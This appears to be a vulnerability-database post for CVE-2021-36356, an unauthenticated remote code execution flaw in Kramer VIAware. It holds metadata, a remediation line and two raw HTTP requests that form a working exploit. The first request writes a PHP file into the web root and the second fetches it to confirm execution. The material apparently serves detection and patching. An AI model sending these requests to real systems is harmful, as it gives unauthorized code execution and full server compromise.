---
layout: post
cve_id: CVE-2021-36356
title: Kramer VIAware - Remote Code Execution
pcap: true
pcap_path: /pcaps/2021/CVE-2021-36356.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-36356.yaml
snort2_rule: N/A
snort3_rule: N/A
author: gy741
severity: critical
impact: 'Unauthenticated attackers can upload arbitrary PHP files to the web root,
  achieving remote code execution and complete server compromise.

  '
remediation: 'Apply the latest firmware update provided by Kramer to fix the vulnerability
  and ensure proper input validation in the web interface.

  '
reference:
- https://www.exploit-db.com/exploits/50856
- https://nvd.nist.gov/vuln/detail/CVE-2021-36356
- https://nvd.nist.gov/vuln/detail/CVE-2021-35064
- https://write-up.github.io/kramerav/
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-36356
  cwe-id: CWE-434
  epss-score: 0.91156
  epss-percentile: 0.99625
  cpe: cpe:2.3:a:kramerav:viaware:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: kramerav
  product: viaware
tags:
- cve2021
- cve
- viaware
- kramer
- edb
- rce
- intrusive
- kramerav
- vkev
- vuln
---

## üîç Vulnerability Description
KRAMER VIAware through August 2021 allows remote attackers to execute arbitrary code because ajaxPages/writeBrowseFilePathAjax.php accepts arbitrary executable pathnames.

## üåê HTTP Request
```nohighlight
POST /ajaxPages/writeBrowseFilePathAjax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/3.6.7
Connection: close
Content-Length: 138
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

radioBtnVal=%3C%3Fphp+echo+md5%28%22CVE-2021-35064%22%29%3B+%3F%3E&associateFileName=%2Fvar%2Fwww%2Fhtml%2F38FLmXeCNuMSlKhIWqfdx44O82u.php
```

```nohighlight
GET /38FLmXeCNuMSlKhIWqfdx44O82u.php' HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Connection: close
Accept-Encoding: gzip
```

